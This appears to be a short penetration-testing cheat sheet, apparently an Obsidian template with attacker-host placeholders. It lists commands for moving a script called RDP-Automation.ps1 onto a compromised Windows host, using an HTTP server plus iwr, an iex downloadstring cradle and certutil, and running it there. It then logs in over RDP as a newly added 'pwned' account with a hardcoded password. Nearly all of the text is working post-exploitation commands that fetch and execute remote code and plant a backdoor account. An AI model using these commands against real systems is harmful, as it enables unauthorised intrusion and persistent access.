

download the script 
```powershell
wget https://raw.githubusercontent.com/Y3llowDuck/RDP-Automation/refs/heads/main/RDP-Automation.ps1 
```

start python server
```powershell
python3 -m http.server 80
```

download it 
```powershell
iwr -uri http://<% tp.frontmatter["LHOST"] %>/RDP-Automation.ps1 -Outfile RDP-Automation.ps1
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["LHOST"] %>/RDP-Automation.ps1' -OutFile 'C:\Users\<% tp.frontmatter["domain-username"] %>\RDP-Automation.ps1'"
iex(new-object net.webclient).downloadstring("http://<% tp.frontmatter["LHOST"] %>/RDP-Automation.ps1")
certutil -urlcache -split -f "http://<% tp.frontmatter["LHOST"] %>/RDP-Automation.ps1" 'C:\Users\<% tp.frontmatter["domain-username"] %>\RDP-Automation.ps1'
```

run it 
```powershell
C:\Users\<% tp.frontmatter["domain-username"] %>\RDP-Automation.ps1
```

we can login with our newly added user `pwned` and it's password `YourSecurePassword123`
```powershell
xfreerdp3 /cert:ignore /u:pwned /p:'YourSecurePassword123' /v:<% tp.frontmatter["RHOSTS"] %> +dynamic-resolution
```